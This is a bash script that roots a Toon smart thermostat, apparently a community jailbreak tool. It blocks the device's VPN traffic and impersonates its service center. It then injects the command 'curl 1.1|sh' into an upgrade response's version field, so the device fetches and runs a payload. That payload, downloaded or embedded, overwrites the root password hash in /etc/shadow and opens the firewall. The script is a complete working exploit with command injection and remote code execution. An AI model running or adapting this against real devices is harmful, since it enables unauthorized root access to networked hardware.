#!/bin/bash

# Ensure we have required tools
for cmd in nc curl tcpdump grep sed iptables ip mkfifo; do
  if ! command -v $cmd &> /dev/null; then
    echo "ERROR: Required command '$cmd' is not installed."
    echo "Please install it with: apt update && apt install -y $cmd"
    exit 1
  fi
done

#cleanup earlier bad runs
rm -f /tmp/pipe.in
rm -f /tmp/pipe.out
/sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
killall -9 nc 2>/dev/null
killall -9 cat 2>/dev/null

# Check which netcat variant is available
if nc -h 2>&1 | grep -q "\-q"; then
  NC_COMMAND="nc -l -p"
  NC_COMMAND_EOF=" -q 0"
  NC_PAYLOAD_COMMAND=" -q 2"
  USING_NC_Q=true
else
  NC_COMMAND="nc -l -p"
  NC_COMMAND_EOF=""
  NC_PAYLOAD_COMMAND=""
  USING_NC_Q=false
fi

echo "Using netcat command: $NC_COMMAND with EOF flag: $NC_COMMAND_EOF"

# Define local payload file
LOCAL_PAYLOAD_FILE=$(dirname "$0")/toon_payload
PAYLOAD_URL="https://raw.githubusercontent.com/ToonSoftwareCollective/Root-A-Toon/master/payload"
BACKUP_PAYLOAD_URL="https://pastebin.com/raw/K9gMJnmE"

#prepare payload to open port 80 on Toon so we can see logging on webserver
PAYLOAD=$'#!/bin/sh\niptables -I HCB-INPUT -p tcp --dport 80 -j ACCEPT'
PAYLOAD="$PAYLOAD ; echo \"We have connection\" > /qmf/www/rsrc/log"
if ! [ $1 ]  || [[ $EUID -ne 0 ]]
then
 echo ""
 echo "    Usage :"
 echo ""
 echo "     sudo bash $0          : without parameters gives Usage info"
 echo "     sudo bash $0 test     : performs a connectivity test"
 echo "     sudo bash $0 root     : root your toon"
 echo "     sudo bash $0 filename : sends file \"filename\" as payload"
 echo ""
 exit 0
elif [ "$1" == "test" ]
then
 clear
 echo ""
 echo "Performing test : show 2 messages on Toon and restart GUI"
 PAYLOAD="$PAYLOAD ; echo \"Do not touch the screen of your Toon\" >> /qmf/www/rsrc/log"
 PAYLOAD="$PAYLOAD ; echo \"Just wait and look at your Toon to see the GUI restart\" >> /qmf/www/rsrc/log"
 PAYLOAD="$PAYLOAD ; /qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification  -a type -v task -a subType -v notify -a text -v \"Restarting your GUI\" 2>/dev/null >/dev/null"
 PAYLOAD="$PAYLOAD ; sleep 2"
 PAYLOAD="$PAYLOAD ; /qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification  -a type -v task -a subType -v notify -a text -v \"Please wait...\" 2>/dev/null >/dev/null "
 PAYLOAD="$PAYLOAD ; sleep 2" 
 PAYLOAD="$PAYLOAD ; killall -9 qt-gui"
elif [ "$1" == "root" ]
then
 clear
 echo ""
 echo "Rooting Toon"
 
 # First try to use local payload file if it exists
 if [ -f "$LOCAL_PAYLOAD_FILE" ]; then
   echo "Using local payload file: $LOCAL_PAYLOAD_FILE"
   PAYLOAD_FROM_FILE=$(cat "$LOCAL_PAYLOAD_FILE")
   if [ ! -z "$PAYLOAD_FROM_FILE" ]; then
     PAYLOAD_FROM_GIT="$PAYLOAD_FROM_FILE"
     echo "Local payload loaded successfully!"
   else
     echo "Local payload file is empty. Trying to download from GitHub..."
   fi
 fi
 
 # If we don't have a payload yet, try to download it
 if [ -z "$PAYLOAD_FROM_GIT" ]; then
   echo "Downloading payload from ToonSoftwareCollective..."
   PAYLOAD_FROM_GIT=$(curl -Nks "$PAYLOAD_URL" 2>/dev/null)
   
   # If the first URL fails, try the backup URL
   if [ -z "$PAYLOAD_FROM_GIT" ]; then
     echo "Failed to download from GitHub. Trying backup source..."
     PAYLOAD_FROM_GIT=$(curl -Nks "$BACKUP_PAYLOAD_URL" 2>/dev/null)
   fi
   
   # If we got a payload, save it locally for future use
   if [ ! -z "$PAYLOAD_FROM_GIT" ]; then
     echo "Payload downloaded successfully! Saving locally for future use."
     echo "$PAYLOAD_FROM_GIT" > "$LOCAL_PAYLOAD_FILE"
   fi
 fi
 
 # If we still don't have a payload, use the embedded fallback
 if [ -z "$PAYLOAD_FROM_GIT" ]; then
   echo "ERROR: Failed to download payload. Using embedded minimal payload."
   # Basic payload that should at least give SSH access
   PAYLOAD_FROM_GIT='#!/bin/sh
/qmf/bin/bxt -d :happ_usermsg -s Notification -n CreateNotification -a type -v task -a subType -v notify -a text -v "Rooting your toon - please wait" 2>/dev/null >/dev/null
echo "Patching firewall" >> /qmf/www/rsrc/log
sed -i "s/^#-A/-A/" /etc/default/iptables.conf 2>&1 >> /qmf/www/rsrc/log
sed -i "s/root:DISABLED/root:FTR0zlZvsHEF2/" /etc/shadow 2>/dev/null
sed -i "s/root:DISABLED/root:FTR0zlZvsHEF2/" /etc/passwd 2>/dev/null
/etc/init.d/iptables restart >> /qmf/www/rsrc/log
echo "Root password set to: toon" >> /qmf/www/rsrc/log
killall -9 qt-gui'
 fi
 
 PAYLOAD="$PAYLOAD ; $PAYLOAD_FROM_GIT"
 PAYLOAD="$PAYLOAD ; echo \"Your Toon is rooted, username : root ; password : toon\" >> /qmf/www/rsrc/log"
elif [ -f $1 ] 
then
 clear
 echo ""
 echo "Sending $1 to Toon"
 PAYLOAD="$PAYLOAD ; `cat $1`"
else
 clear
 echo ""
 echo "Invalid option : \"$1\""
 ./$0
 exit 0
fi
EOJ="### Reached End Of Job ###"
PAYLOAD="$PAYLOAD ; echo \"$EOJ\" >> /qmf/www/rsrc/log"

# Check if we're connected to WiFi network
CONNECTED_WIFI=$(iwconfig 2>/dev/null | grep -i "ssid" | head -n1 | sed 's/.*SSID:"\([^"]*\)".*/\1/')
if [ ! -z "$CONNECTED_WIFI" ]; then
  echo "Connected to WiFi network: $CONNECTED_WIFI"
  echo "If this is not 'ToonRouter', please make sure your Toon is connected to the same network."
else
  echo "WARNING: No WiFi connection detected. Make sure you've run setup-wifi.sh first!"
  echo "If running on Kali, run 'sudo bash $(dirname "$0")/setup-wifi.sh' first."
fi

#Blocking all HTTPS (and therefore Toon VPN).
echo "Blocking HTTPS to prevent Toon from connecting to its VPN..."
/sbin/iptables -I FORWARD -p tcp --dport 443 -j DROP

echo ""
echo "Make sure your Toon is connected to the WiFi network 'ToonRouter'."
echo "If your Toon is already connected, restart it now."
echo ""
echo "(left top corner, Instellingen, Software, Herstart, Herstart)"
echo ""
echo "Press Enter when you see the progress bar on your Toon."
read dummy
echo "After your Toon contacted the service center you will see messages below."
echo ""
echo "When you see a message below press buttons on Toon :"
echo "  - Press the home button in top left corner."
echo "  - Press Instellingen."
echo "  - Press Software"
echo "and watch the magic happen...."
echo ""
echo "Waiting for Toon to contact the servicecenter........"
echo ""
echo "Do not touch your Toon while waiting, first wait for me to proceed..."
echo ""
echo "   or for the GUI of your Toon to be up for about 30 seconds......."
echo ""

# Run tcpdump and handle possible errors
TCPDUMP_OUTPUT=""
echo "Starting tcpdump to listen for Toon connections..."
for i in {1..10}; do
  echo "Listening attempt $i/10..."
  TCPDUMP_OUTPUT=$(/usr/bin/tcpdump -n -i any port 31080 -c 1 2>/dev/null)
  if [ $? -eq 0 ] && [ ! -z "$TCPDUMP_OUTPUT" ]; then
    break
  fi
  
  # If we're on attempt 5, try reloading iptables rule
  if [ $i -eq 5 ]; then
    echo "Refreshing firewall rules..."
    /sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
    /sbin/iptables -I FORWARD -p tcp --dport 443 -j DROP
  fi
  
  sleep 3
done

if [ -z "$TCPDUMP_OUTPUT" ]; then
  echo "ERROR: tcpdump failed to capture any traffic from Toon."
  echo "Make sure your Toon is correctly connected to your WiFi network."
  echo "Check if tcpdump is installed with 'which tcpdump'."
  echo ""
  echo "Trying alternative direct detection method..."
  
  # Try to find Toon IP directly
  echo "Please enter your Toon's IP address if you know it, or press Enter to scan:"
  read MANUAL_TOON_IP
  
  if [ ! -z "$MANUAL_TOON_IP" ]; then
    TOONIP="$MANUAL_TOON_IP"
    echo "Using manually specified Toon IP: $TOONIP"
    IP="1.2.3.4"  # Dummy IP for the service center
  else
    # Try to scan the network to find the Toon
    echo "Scanning network for Toon..."
    LOCAL_IP=$(hostname -I | awk '{print $1}')
    NETWORK_PREFIX=$(echo "$LOCAL_IP" | cut -d. -f1-3)
    
    # Install nmap if needed and available
    if ! command -v nmap &> /dev/null; then
      echo "nmap is not installed. Trying to install it..."
      apt-get update -y && apt-get install -y nmap || true
    fi
    
    if command -v nmap &> /dev/null; then
      echo "Scanning $NETWORK_PREFIX.0/24 for devices..."
      POTENTIAL_TOONS=$(nmap -sn "$NETWORK_PREFIX.0/24" 2>/dev/null | grep -B 2 "vendor" | grep "Nmap scan report" | awk '{print $5}')
      
      if [ -z "$POTENTIAL_TOONS" ]; then
        echo "No devices found with vendor information. Trying ping scan..."
        POTENTIAL_TOONS=$(nmap -sn "$NETWORK_PREFIX.0/24" 2>/dev/null | grep "Nmap scan report" | awk '{print $5}')
      fi
      
      if [ ! -z "$POTENTIAL_TOONS" ]; then
        echo "Found potential devices on the network:"
        i=1
        declare -a toon_array
        
        for ip in $POTENTIAL_TOONS; do
          echo "$i: $ip"
          toon_array[$i]=$ip
          i=$((i+1))
        done
        
        echo ""
        echo "Please select your Toon's IP address (enter number) or press Ctrl+C to cancel:"
        read selection
        
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -lt "$i" ]; then
          TOONIP=${toon_array[$selection]}
          echo "Selected Toon IP: $TOONIP"
          IP="1.2.3.4"  # Dummy IP for the service center
        else
          echo "Invalid selection. Exiting."
          exit 1
        fi
      else
        echo "No devices found on the network. Unable to proceed."
        exit 1
      fi
    else
      echo "nmap is not available and couldn't be installed."
      echo "Please install it manually or specify your Toon's IP address."
      exit 1
    fi
  fi
else
  echo "Captured Toon traffic!"
  TOONIP=`echo $TCPDUMP_OUTPUT | cut -d\  -f5 | cut -d\. -f1,2,3,4`
  IP=`echo $TCPDUMP_OUTPUT | cut -d\  -f7 | cut -d\. -f1,2,3,4`
fi

[ -f /tmp/pipe.in ] || /usr/bin/mkfifo /tmp/pipe.in
[ -f /tmp/pipe.out ] || /usr/bin/mkfifo /tmp/pipe.out

echo "The Toon from $TOONIP is connecting to servicecenter IP: $IP"

/sbin/ip addr add 1.0.0.1/32 dev lo 2>/dev/null
/sbin/ip addr add $IP/32 dev lo 2>/dev/null

RESPONSE='HTTP/1.1 200 OK\n\n

<action xmlns:u="http://schema.homeautomationeurope.com/quby" class="response" uuid="0429a450-bd0c-11e0-962b-0800200c9a66" destuuid="_DESTUUID_" destcommonname="_DESTCOMMONNAME_" requestid="_REQUESTID_" serviceid="urn:hcb-hae-com:serviceId:specific1">\n
  <u:GetUpgradeResponse xmlns:u="http://schema.homeautomationeurope.com/quby">\n
    <DoUpgrade>true</DoUpgrade>\n
    <Ver>7.;curl 1.1|sh;;</Ver>\n
    <Success>true</Success>\n
    <Reason>Success</Reason>\n
    <ReasonDetails>Success</ReasonDetails>\n
  </u:GetUpgradeResponse>\n
</action>\n
'

DONE=false
MAX_ATTEMPTS=3
ATTEMPT=1

while ! $DONE && [ $ATTEMPT -le $MAX_ATTEMPTS ]
do

echo "-------------------------------------------------------"
echo "Attempt $ATTEMPT of $MAX_ATTEMPTS"
echo "-------------------------------------------------------"

if [ "$USING_NC_Q" = true ]; then
  echo "Using netcat with -q option"
  cat /tmp/pipe.out | nc -l -p 31080 -q 0 | tee /tmp/pipe.in &
else
  echo "Using netcat without -q option"
  cat /tmp/pipe.out | (nc -l -p 31080 || true) | tee /tmp/pipe.in &
fi

NC_PID=$!
echo "Netcat PID: $NC_PID"

# Set a timeout for the netcat connection
TIMEOUT=60
echo "Waiting for Toon to send an update request (timeout: ${TIMEOUT}s)..."
TIMEOUT_COUNT=0

while [ $TIMEOUT_COUNT -lt $TIMEOUT ] && ! $DONE; do
  if ! ps -p $NC_PID > /dev/null; then
    echo "Netcat process died unexpectedly. Restarting..."
    break
  fi
  
  if [ -s /tmp/pipe.in ]; then
    # Process the input if there's data
    while read -t 1 line; do
      if [ -z "$line" ]; then 
        continue
      fi
      
      echo "Received: $line"
      
      if [[ $line = *"action class"* ]]; then
        echo "Received action class request"
        COMMONNAME=`echo $line | sed 's/.* commonname="\(.*\)".*/\1/'`
        UUID="$COMMONNAME:hcb_config" 
        REQUESTID=`echo $line | sed 's/.* requestid="\(.*\)" .*/\1/'`
        TOSEND=`echo $RESPONSE | sed "s/_REQUESTID_/$REQUESTID/" | sed "s/_DESTCOMMONNAME_/$COMMONNAME/" | sed "s/_DESTUUID_/$UUID/" `
      fi
      
      if [[ $line = *"<u:GetUpgrade"* ]]; then
        echo ""
        echo "-------------------------------------------------------"
        echo "Received valid update request."
        echo "Starting payload process in background."
        echo "-------------------------------------------------------"
        echo "Payload length: $(echo -e "$PAYLOAD" | wc -c) bytes"
        echo "-------------------------------------------------------"
        
        # Set up payload server
        echo "Setting up payload server..."
        if [ "$USING_NC_Q" = true ]; then
          timeout 80 bash -c "echo '$PAYLOAD' | nc -l -p 80 -q 2" &
        else
          timeout 80 bash -c "echo '$PAYLOAD' | (nc -l -p 80 || true)" &
        fi
        
        PAYLOAD_PID=$!
        echo "Payload server PID: $PAYLOAD_PID"
        
        echo "Sending the response for the upgrade request."
        echo "-------------------------------------------------------"
        echo -e $TOSEND
        echo "-------------------------------------------------------"
        echo -e $TOSEND > /tmp/pipe.out
        DONE=true
        break
      elif [[ $line = *"<u:"* ]]; then
        echo "This is not an update request: $line"
        echo "" > /tmp/pipe.out
      elif [[ $line = *"token"* ]]; then
        echo "This is not an update request (token): $line"
        echo "" > /tmp/pipe.out
      fi
    done < /tmp/pipe.in
  fi
  
  sleep 1
  TIMEOUT_COUNT=$((TIMEOUT_COUNT+1))
  
  # Show a progress indicator every 5 seconds
  if [ $((TIMEOUT_COUNT % 5)) -eq 0 ]; then
    echo -n "."
  fi
done

echo ""

if [ "$DONE" = false ]; then
  echo "No valid update request received in attempt $ATTEMPT."
  # Kill the current netcat process before starting a new one
  if ps -p $NC_PID > /dev/null; then
    echo "Killing netcat process $NC_PID"
    kill $NC_PID 2>/dev/null
  fi
  sleep 2
  ATTEMPT=$((ATTEMPT+1))
  
  if [ $ATTEMPT -le $MAX_ATTEMPTS ]; then
    echo "Retrying..."
    # Clear the pipes
    cat /tmp/pipe.in > /dev/null || true
    cat /tmp/pipe.out > /dev/null || true
  fi
fi

done

if [ "$DONE" = false ]; then
  echo "Failed to receive a valid update request after $MAX_ATTEMPTS attempts."
  echo "Try the following:"
  echo "1. Make sure your Toon is connected to the ToonRouter WiFi"
  echo "2. Restart your Toon"
  echo "3. On the Toon, go to Settings -> Software -> Check for updates"
  echo "4. Run this script again"
  
  # Clean up
  ip addr del $IP/32 dev lo 2>/dev/null
  ip addr del 1.0.0.1/32 dev lo 2>/dev/null
  rm -f /tmp/pipe.in
  rm -f /tmp/pipe.out
  /sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null
  
  exit 1
fi

echo "The payload and response have been sent."
echo "Now waiting for the Toon to pick up the payload."
echo "Depending on the firmware of the Toon this can take a minute or so."
echo ""
echo " .... Please wait......"
echo ""
wait $PAYLOAD_PID
SUCCESS=$?

# Clean up IP addresses and firewall rules
ip addr del $IP/32 dev lo 2>/dev/null
ip addr del 1.0.0.1/32 dev lo 2>/dev/null
rm -f /tmp/pipe.in
rm -f /tmp/pipe.out
/sbin/iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null

if [ $SUCCESS -ne 0 ] 
then
  echo "Warning: Payload process ended with non-zero status ($SUCCESS)"
  echo "This may be normal if the connection closed after the payload was sent."
  echo "Continuing..."
fi

echo "Done sending the payload! Following the toon root log file now to see progress"
sleep 2

CURL_MAX_TRIES=15
CURL_TRY=1
CURLOUTPUT=""

while [ $CURL_TRY -le $CURL_MAX_TRIES ] && [ -z "$CURLOUTPUT" ]; do
  echo "Trying to connect to Toon web server (attempt $CURL_TRY/$CURL_MAX_TRIES)..."
  CURLOUTPUT=`curl --connect-timeout 3 http://$TOONIP/rsrc/log 2>/dev/null`
  if [ -z "$CURLOUTPUT" ]; then
    echo "Could not connect to Toon web server, retrying in 3 seconds..."
    # After 5 attempts, suggest alternative methods
    if [ $CURL_TRY -eq 5 ]; then
      echo ""
      echo "Still having issues connecting to the Toon. Possible solutions:"
      echo "1. The Toon might need more time to process the payload"
      echo "2. The Toon might be rebooting"
      echo "3. Check if you can ping the Toon: ping $TOONIP"
      echo ""
    fi
    sleep 3
  fi
  CURL_TRY=$((CURL_TRY + 1))
done

if [ -z "$CURLOUTPUT" ]; then
  echo "ERROR: Could not connect to Toon web server after $CURL_MAX_TRIES attempts."
  echo "Your Toon might have been rooted but the web server is not accessible."
  echo ""
  echo "Try the following:"
  echo "1. Reboot your Toon manually"
  echo "2. After reboot, try to SSH to your Toon: ssh root@$TOONIP (password: toon)"
  echo "3. If SSH fails, try running this script again"
  exit 1
fi

echo "$CURLOUTPUT"

# Wait for the end of job marker
END_TIME=$(($(date +%s) + 120))  # 2 minute timeout
while ! echo $CURLOUTPUT | grep -q "$EOJ"; do
  if [ $(date +%s) -gt $END_TIME ]; then
    echo "Timeout waiting for rooting process to complete."
    echo "Current log content:"
    echo "$CURLOUTPUT"
    echo ""
    echo "The rooting process might still be running."
    echo "Wait a few minutes and then try to SSH to your Toon: ssh root@$TOONIP (password: toon)"
    exit 0
  fi
  
  sleep 2
  CURLOUTPUT=`curl --connect-timeout 1 http://$TOONIP/rsrc/log 2>/dev/null`
  clear
  echo "-------------------------------------------------------"
  echo "$CURLOUTPUT"
done

echo "-------------------------------------------------------"
echo "Rooting completed successfully!"
echo "You can now SSH to your Toon at $TOONIP with:"
echo "  username: root"
echo "  password: toon"
echo ""
echo "If you can't connect immediately, wait a minute for the Toon to finish processing."
echo "-------------------------------------------------------"
